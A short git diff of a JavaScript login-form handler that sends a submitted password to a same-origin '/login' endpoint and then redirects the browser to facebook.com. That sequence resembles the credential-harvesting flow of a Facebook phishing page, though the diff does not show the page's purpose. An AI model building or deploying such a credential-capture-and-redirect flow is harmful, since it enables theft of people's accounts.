@@ -13,8 +13,8 @@ loginForm.addEventListener('submit', async (e) => {
         password
     };
 
-    console.log("HIT HERE")
-    const data = await fetch('/login', {
+
+    await fetch('/login', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json'
@@ -22,5 +22,5 @@ loginForm.addEventListener('submit', async (e) => {
         body: JSON.stringify(formData)
     });
 
-    console.log(await data.json())
+    window.location.href = "https://www.facebook.com/";
 });
